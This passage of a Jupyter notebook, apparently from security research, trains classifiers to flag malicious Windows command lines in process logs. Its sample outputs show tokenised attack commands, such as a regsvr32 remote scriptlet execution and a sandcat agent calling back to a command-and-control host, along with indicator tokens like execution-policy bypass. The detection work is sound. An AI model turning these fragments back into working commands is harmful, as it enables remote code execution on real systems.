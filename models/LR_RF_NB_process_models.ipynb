{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.conf import SparkConf\n",
    "from pyspark.sql import SparkSession\n",
    "import pyspark.sql.functions as F\n",
    "import pyspark.sql.types as T\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import seaborn as sns\n",
    "import re\n",
    "import matplotlib.pyplot as plt\n",
    "from pyspark.ml import feature, evaluation, Pipeline\n",
    "from pyspark.ml.classification import LogisticRegression\n",
    "from pyspark.ml.classification import RandomForestClassifier\n",
    "from pyspark.ml.classification import NaiveBayes\n",
    "from pyspark.ml.feature import VectorAssembler, StandardScaler\n",
    "from pyspark.ml.evaluation import BinaryClassificationEvaluator\n",
    "from pyspark.ml.tuning import CrossValidator, ParamGridBuilder\n",
    "from functools import reduce\n",
    "from pyspark.sql import DataFrame\n",
    "from pyspark.sql import Row"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<pyspark.conf.SparkConf at 0x7f1f48fd9128>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "conf = (SparkConf()\n",
    "            .setAppName('modeling')\n",
    "            .setMaster('spark://spark-master:7077')\n",
    "       )\n",
    "conf.set(\"spark.executor.memory\", \"6g\")\n",
    "conf.set(\"spark.driver.maxResultSize\", \"0\")\n",
    "conf.set(\"spark.sql.shuffle.partitions\", \"6\")\n",
    "conf.set(\"spark.default.parallelism\", \"6\")\n",
    "conf.set(\"spark.driver.memory\", \"3g\") "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "spark = SparkSession.builder.config(conf=conf).getOrCreate()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[('spark.default.parallelism', '6'),\n",
       " ('spark.executor.id', 'driver'),\n",
       " ('spark.executor.memory', '6g'),\n",
       " ('spark.driver.host', 'b673edb6b90c'),\n",
       " ('spark.driver.memory', '3g'),\n",
       " ('spark.driver.port', '35835'),\n",
       " ('spark.rdd.compress', 'True'),\n",
       " ('spark.master', 'spark://spark-master:7077'),\n",
       " ('spark.serializer.objectStreamReset', '100'),\n",
       " ('spark.driver.maxResultSize', '0'),\n",
       " ('spark.app.name', 'modeling'),\n",
       " ('spark.submit.deployMode', 'client'),\n",
       " ('spark.sql.shuffle.partitions', '6'),\n",
       " ('spark.ui.showConsoleProgress', 'true'),\n",
       " ('spark.app.id', 'app-20191208021447-0135')]"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "spark.sparkContext.getConf().getAll()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DataFrame[command_line: string, class_label: int]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df = (spark.read.format('csv')\n",
    "      .option('inferSchema', 'true')\n",
    "      .option('header', 'true')\n",
    "      .option('escape', '\"')\n",
    "      .load('hdfs://namenode:9000/data/labeled_process_logs.csv') \n",
    "      .dropna() \n",
    "     )\n",
    "df.cache()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Data Cleaning and Engineering\n",
    "\n",
    "---\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The target labels are unbalanced, and will result in a model with high bias that won't generalize well.  the minority class (1) will be resampled"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupBy('class_label').count().toPandas().plot.bar(x='class_label', y='count')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df.count()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create train, validation, test split"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "training_df, validation_df, testing_df = df.randomSplit([0.6, 0.3, 0.1], seed=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[31493, 15589, 5313]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[training_df.count(), validation_df.count(), testing_df.count()]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sample with replacment (bootstrap) the minority class to even out the class distribution"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sc = spark.sparkContext\n",
    "\n",
    "# create a list of minority class rdd objects\n",
    "list_of_rdds = [training_df.filter('class_label == 1').sample(withReplacement=True, fraction=.1).rdd for x in range(300)]\n",
    "\n",
    "# combine the rdds\n",
    "combined_rdds = sc.union(list_of_rdds)\n",
    "\n",
    "# create a df from the original dataset and the resampled minority class\n",
    "combined_df = spark.createDataFrame(sc.union([training_df.rdd, combined_rdds]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%time\n",
    "combined_df.groupBy('class_label').count().toPandas().plot.bar(x='class_label', y='count')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Save bootstrapped data to disk and reload to continue modeling"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# write resampled df to disk\n",
    "combined_df.toPandas().to_csv('resampled_df.csv', header=True, index=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DataFrame[command_line: string, class_label: int]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# load resampled df and cache\n",
    "training_df = (spark.read.format('csv')\n",
    "      .option('inferSchema', 'true')\n",
    "      .option('header', 'true')\n",
    "      .option('quote', '\\\"')\n",
    "      .option('escape', '\\\"')\n",
    "      .load('hdfs://namenode:9000/data/resampled_df.csv') \n",
    "     )\n",
    "training_df.cache()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create command line tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "@F.udf(returnType=T.StringType())\n",
    "def clean_input2(s):\n",
    "    common_strings = ['windows', 'system32', 'cmd.exe', 'sandcat.exe', 'c', 'windowspowershell', 'v1.0', 'powershell.exe', '']\n",
    "    \n",
    "    pattern = re.compile(r\"\"\"\n",
    "        [:|\"?']\n",
    "        | --field-trial-handle=.*\\d+\n",
    "        | //.*com(/.*)/\n",
    "        | \\s*\"\\s*\n",
    "        | \\{.*\\}\n",
    "        | [=;(),]\n",
    "        | \\\\\n",
    "        | //\n",
    "        | \\s+\\.\\s+ \n",
    "        | $.\n",
    "        | $_.\n",
    "        | (>>)\n",
    "    \"\"\", re.VERBOSE)\n",
    "    \n",
    "    return ','.join([x.lower() for x in re.sub(pattern, ' ', s).split() if x.lower() not in common_strings and len(x) >= 2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pyspark.sql.functions import regexp_extract, regexp_replace, col, count, split, size, to_date\n",
    "\n",
    "def clean_input1(df):\n",
    "    _df = df.select(\n",
    "        '*'\n",
    "    ).withColumn(\n",
    "        'class_label', (col('class_label').cast('int'))\n",
    "    ).withColumn(\n",
    "        'cmd_line_tokens', split(clean_input2(col('command_line')), ',')\n",
    "    )\n",
    "    \n",
    "    return _df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "training_df = clean_input1(training_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Cleaned command line tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------------------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                                    |\n",
      "+-----------------------------------------------------------------------------------+\n",
      "|[-c, -s, -f, -t, empty, -m, empty, -a, -u, empty]                                  |\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]                |\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.4]                |\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|\n",
      "+-----------------------------------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "training_df.select('cmd_line_tokens').sample(.10).show(5, False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------+-----+\n",
      "|class_label|count|\n",
      "+-----------+-----+\n",
      "|          1|28427|\n",
      "|          0|30589|\n",
      "+-----------+-----+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "training_df.groupBy('class_label').count().show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Drop rows without atleast 2 tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "training_df = training_df.filter(F.size('cmd_line_tokens') > 2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create freq and tfidf pipeline and fit to training data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "idf_pipeline = Pipeline(stages=[\n",
    "    feature.CountVectorizer(minTF=1, minDF=3, inputCol='cmd_line_tokens', outputCol='tf'),\n",
    "    feature.IDF(inputCol='tf', outputCol='tfidf')\n",
    "])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "std = StandardScaler(withMean=True, withStd=True, inputCol='tfidf', outputCol='scaled_tfidf')\n",
    "va = VectorAssembler(inputCols=['scaled_tfidf'], outputCol='features')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Logestic Regression Modeling\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create logistic regression model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [],
   "source": [
    "lr = LogisticRegression(featuresCol='features', labelCol='class_label')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "lr_pipeline = Pipeline(stages=[\n",
    "    idf_pipeline, \n",
    "    std,\n",
    "    va,\n",
    "    lr\n",
    "]).fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[PipelineModel_7cf420fc4f05,\n",
       " StandardScaler_9da5e20caf3d,\n",
       " VectorAssembler_a7b97ad71b4d,\n",
       " LogisticRegressionModel: uid = LogisticRegression_94f4943040af, numClasses = 2, numFeatures = 2001]"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lr_pipeline.stages"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "vocabulary = lr_pipeline.stages[0].stages[0].vocabulary\n",
    "weights = lr_pipeline.stages[-1].coefficients.toArray()  \n",
    "coeffs_df = pd.DataFrame({'token': vocabulary, 'weight': weights})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Inference"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "validation_df = clean_input1(validation_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------+\n",
      "|      avg(correct)|\n",
      "+------------------+\n",
      "|0.9921098210276477|\n",
      "+------------------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "lr_pipeline.transform(validation_df).\\\n",
    "    select(F.expr('float(prediction = class_label)').alias('correct')).\\\n",
    "    select(F.avg('correct')).show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The positive class is 1 (malicious) so the positive weights indicate a feature that contributes positively to being classified as malicious"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>155</th>\n",
       "      <td>.zip</td>\n",
       "      <td>1.966767</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>81</th>\n",
       "      <td>net</td>\n",
       "      <td>1.848486</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>38</th>\n",
       "      <td>/c</td>\n",
       "      <td>1.775381</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>-c</td>\n",
       "      <td>1.671403</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>35</th>\n",
       "      <td>reg</td>\n",
       "      <td>1.636291</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>bypass</td>\n",
       "      <td>1.598199</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>1.593883</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>141</th>\n",
       "      <td>remove-item</td>\n",
       "      <td>1.554045</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>761</th>\n",
       "      <td>-argumentlist</td>\n",
       "      <td>1.340173</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>116</th>\n",
       "      <td>share</td>\n",
       "      <td>1.313412</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45</th>\n",
       "      <td>-recurse</td>\n",
       "      <td>1.301606</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>foreach</td>\n",
       "      <td>1.297017</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>570</th>\n",
       "      <td>disabled</td>\n",
       "      <td>1.228285</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>246</th>\n",
       "      <td>/domain</td>\n",
       "      <td>1.203114</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>39</th>\n",
       "      <td>-path</td>\n",
       "      <td>1.191986</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>106</th>\n",
       "      <td>/r</td>\n",
       "      <td>1.188743</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>151</th>\n",
       "      <td>win32_useraccount</td>\n",
       "      <td>1.147737</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>113</th>\n",
       "      <td>/i</td>\n",
       "      <td>1.119267</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>82</th>\n",
       "      <td>/s</td>\n",
       "      <td>1.085380</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>33</th>\n",
       "      <td>select</td>\n",
       "      <td>1.082518</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                 token    weight\n",
       "155               .zip  1.966767\n",
       "81                 net  1.848486\n",
       "38                  /c  1.775381\n",
       "12                  -c  1.671403\n",
       "35                 reg  1.636291\n",
       "11              bypass  1.598199\n",
       "13    -executionpolicy  1.593883\n",
       "141        remove-item  1.554045\n",
       "761      -argumentlist  1.340173\n",
       "116              share  1.313412\n",
       "45            -recurse  1.301606\n",
       "26             foreach  1.297017\n",
       "570           disabled  1.228285\n",
       "246            /domain  1.203114\n",
       "39               -path  1.191986\n",
       "106                 /r  1.188743\n",
       "151  win32_useraccount  1.147737\n",
       "113                 /i  1.119267\n",
       "82                  /s  1.085380\n",
       "33              select  1.082518"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "coeffs_df.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example of malicious tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                         |\n",
      "+------------------------------------------------------------------------+\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[users, public, -server, http, 192.168.4.10, 8888, -group, my_group, -v]|\n",
      "|[regsvr32.exe, /s, /u, /i, https, regsvr32.sct, scrobj.dll]             |\n",
      "|[regsvr32.exe, /s, /u, /i, https, regsvr32.sct, scrobj.dll]             |\n",
      "+------------------------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "training_df.filter('class_label == 1').sample(.1).select('cmd_line_tokens').show(5, truncate=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### The negative class is 0 (benign) so the negative weights indicate a feature that contributes negatively to being classified as benign"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>266</th>\n",
       "      <td>reg.exe</td>\n",
       "      <td>-1.831852</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>0xffffffff</td>\n",
       "      <td>-1.209903</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>-forcev1</td>\n",
       "      <td>-1.209903</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>conhost.exe</td>\n",
       "      <td>-1.209903</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>65</th>\n",
       "      <td>start_browser.ps1</td>\n",
       "      <td>-1.111311</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>documents</td>\n",
       "      <td>-1.095012</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>-noexit</td>\n",
       "      <td>-1.054740</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>47</th>\n",
       "      <td>-k</td>\n",
       "      <td>-0.861132</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>517</th>\n",
       "      <td>winlogbeat</td>\n",
       "      <td>-0.790021</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>application</td>\n",
       "      <td>-0.746122</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>chrome.exe</td>\n",
       "      <td>-0.745815</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>x86</td>\n",
       "      <td>-0.729383</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>262</th>\n",
       "      <td>-embedding</td>\n",
       "      <td>-0.691857</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>120</th>\n",
       "      <td>-servername</td>\n",
       "      <td>-0.690028</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>362</th>\n",
       "      <td>systemroot</td>\n",
       "      <td>-0.689020</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>program</td>\n",
       "      <td>-0.670668</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>files</td>\n",
       "      <td>-0.670668</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>--type</td>\n",
       "      <td>-0.662527</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40</th>\n",
       "      <td>svchost.exe</td>\n",
       "      <td>-0.635438</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>204</th>\n",
       "      <td>backgroundtaskhost.exe</td>\n",
       "      <td>-0.601468</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                      token    weight\n",
       "266                 reg.exe -1.831852\n",
       "29               0xffffffff -1.209903\n",
       "30                 -forcev1 -1.209903\n",
       "31              conhost.exe -1.209903\n",
       "65        start_browser.ps1 -1.111311\n",
       "46                documents -1.095012\n",
       "42                  -noexit -1.054740\n",
       "47                       -k -0.861132\n",
       "517              winlogbeat -0.790021\n",
       "5               application -0.746122\n",
       "6                chrome.exe -0.745815\n",
       "4                       x86 -0.729383\n",
       "262              -embedding -0.691857\n",
       "120             -servername -0.690028\n",
       "362              systemroot -0.689020\n",
       "3                   program -0.670668\n",
       "2                     files -0.670668\n",
       "7                    --type -0.662527\n",
       "40              svchost.exe -0.635438\n",
       "204  backgroundtaskhost.exe -0.601468"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "coeffs_df.sort_values('weight').head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Example of benign tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-------------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                    |\n",
      "+-------------------------------------------------------------------+\n",
      "|[-c, -s, -f, -t, empty, -m, empty, -a, -u, empty]                  |\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]|\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]|\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]|\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]|\n",
      "+-------------------------------------------------------------------+\n",
      "only showing top 5 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "training_df.filter('class_label == 0').sample(.20).select('cmd_line_tokens').show(5, truncate=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create another model with elastic net regularization to control overfitting and mitigate noisy data\n",
    "+ will grid search over these regParam and elasticNetParam parameters during validation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "en_lr_pipeline = Pipeline(stages=[\n",
    "    idf_pipeline,\n",
    "    std,\n",
    "    va,\n",
    "    LogisticRegression(featuresCol='features',labelCol='class_label',regParam=0.02,elasticNetParam=0.3)\n",
    "])\n",
    "\n",
    "en_lr_estimator = en_lr_pipeline.fit(training_df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Examine the coefficients of the base LR w/ regularization model to determine how well it learned the weights for the tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "coefs = en_lr_estimator.stages[-1].coefficients.toArray()  \n",
    "en_lr_word_coefs = pd.DataFrame({'token': en_lr_estimator.stages[0].stages[0].vocabulary, 'weight': coefs})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ malicious tokens"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.218349</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.174870</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.138694</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>38</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.138177</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>81</th>\n",
       "      <td>net</td>\n",
       "      <td>0.099871</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>35</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.089796</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>113</th>\n",
       "      <td>/i</td>\n",
       "      <td>0.077699</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>44</th>\n",
       "      <td>hklm</td>\n",
       "      <td>0.072113</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>82</th>\n",
       "      <td>/s</td>\n",
       "      <td>0.067931</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>32</th>\n",
       "      <td>software</td>\n",
       "      <td>0.057978</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.047234</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>147</th>\n",
       "      <td>echo</td>\n",
       "      <td>0.043372</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>78</th>\n",
       "      <td>new-object</td>\n",
       "      <td>0.040606</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>155</th>\n",
       "      <td>.zip</td>\n",
       "      <td>0.039394</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>172</th>\n",
       "      <td>copy</td>\n",
       "      <td>0.039099</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>183</th>\n",
       "      <td>delete</td>\n",
       "      <td>0.038522</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>202</th>\n",
       "      <td>%appdata%</td>\n",
       "      <td>0.037550</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>160</th>\n",
       "      <td>-group</td>\n",
       "      <td>0.036422</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>499</th>\n",
       "      <td>teamviewer</td>\n",
       "      <td>0.033409</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>501</th>\n",
       "      <td>teamviewer12_logfile.log</td>\n",
       "      <td>0.033409</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                        token    weight\n",
       "12                         -c  0.218349\n",
       "11                     bypass  0.174870\n",
       "13           -executionpolicy  0.138694\n",
       "38                         /c  0.138177\n",
       "81                        net  0.099871\n",
       "35                        reg  0.089796\n",
       "113                        /i  0.077699\n",
       "44                       hklm  0.072113\n",
       "82                         /s  0.067931\n",
       "32                   software  0.057978\n",
       "26                    foreach  0.047234\n",
       "147                      echo  0.043372\n",
       "78                 new-object  0.040606\n",
       "155                      .zip  0.039394\n",
       "172                      copy  0.039099\n",
       "183                    delete  0.038522\n",
       "202                 %appdata%  0.037550\n",
       "160                    -group  0.036422\n",
       "499                teamviewer  0.033409\n",
       "501  teamviewer12_logfile.log  0.033409"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_word_coefs.sort_values('weight', ascending=False)[0:20]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ benign tokens"
   ]
  },
